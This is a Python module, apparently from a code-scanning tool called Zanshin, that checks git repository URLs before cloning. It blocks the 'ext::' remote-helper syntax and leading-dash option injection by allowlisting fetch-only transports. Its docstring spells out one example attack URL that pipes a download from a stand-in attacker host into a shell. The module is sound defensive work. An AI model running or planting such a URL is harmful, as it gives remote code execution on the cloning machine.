"""Validation of the repository URLs Zanshin is willing to hand to git.

`git clone <url>` is not a data-only operation: git resolves a URL of the
form `<transport>::<address>` through an external *remote helper*, and the
built-in `ext::` helper runs its address as a shell command. So
`ext::sh -c 'curl attacker.tld/x | sh'` is a valid clone "URL" that executes
arbitrary code as the Zanshin process — adding a repository would be remote
code execution, not configuration. A leading `-` is the same class of
problem one level down (the value would be parsed as a git option rather
than a URL).

This module therefore allowlists the transports that only ever *fetch*
(https, ssh, and the scp-like `user@host:path` form) rather than trying to
blocklist the dangerous ones, and is called both when a repository is saved
(immediate feedback) and again just before cloning (the choke point that
also covers rows created before this existed, or by any other path).
"""
import logging
import re

logger = logging.getLogger(__name__)

# Schemes that fetch and nothing else. `git://` is deliberately absent: it is
# unauthenticated and unencrypted, so a scan result based on it says nothing
# trustworthy about the code that was actually reviewed.
ALLOWED_SCHEMES = ("https://", "http://", "ssh://")

# The scp-like form git accepts without a scheme: `git@github.com:org/repo.git`.
# The `(?!//)` guard keeps it from swallowing a malformed `scheme://` string.
SCP_LIKE_URL = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9._-]+:(?!//)[^\s]+$")


class InvalidRepositoryUrlError(ValueError):
    """The URL isn't one Zanshin will clone. A `ValueError` subclass so the
    existing UI error handling (which reports `str(e)` in a toast) surfaces
    the reason unchanged."""


def validate_repo_url(url: str) -> str:
    """Return the cleaned URL, or raise `InvalidRepositoryUrlError`."""
    candidate = (url or "").strip()

    if not candidate:
        raise InvalidRepositoryUrlError("L'URL du dépôt est requise.")

    if any(ch.isspace() for ch in candidate) or any(ord(ch) < 0x20 for ch in candidate):
        raise InvalidRepositoryUrlError(
            "L'URL du dépôt ne peut pas contenir d'espace ni de caractère de contrôle."
        )

    if candidate.startswith("-"):
        raise InvalidRepositoryUrlError(
            "L'URL du dépôt ne peut pas commencer par '-' (git l'interpréterait comme une option)."
        )

    # `<transport>::<address>` is git's remote-helper syntax; `ext::` in
    # particular executes its address as a shell command.
    if "::" in candidate:
        raise InvalidRepositoryUrlError(
            "Transport git non autorisé : la syntaxe '<transport>::<adresse>' "
            "(ex. 'ext::') permet l'exécution de commandes arbitraires."
        )

    scheme_match = next((s for s in ALLOWED_SCHEMES if candidate.lower().startswith(s)), None)
    if scheme_match is None and not SCP_LIKE_URL.match(candidate):
        raise InvalidRepositoryUrlError(
            "URL de dépôt non autorisée. Formats acceptés : 'https://…', "
            "'ssh://…' ou 'git@hôte:chemin'."
        )

    if scheme_match == "http://":
        # Allowed (internal git servers still run plaintext) but worth a
        # trace: the checkout can be tampered with in transit, which makes
        # any finding produced from it correspondingly less trustworthy.
        logger.warning("Repository URL uses plaintext http:// — the checkout is not authenticated: %s", candidate)

    return candidate
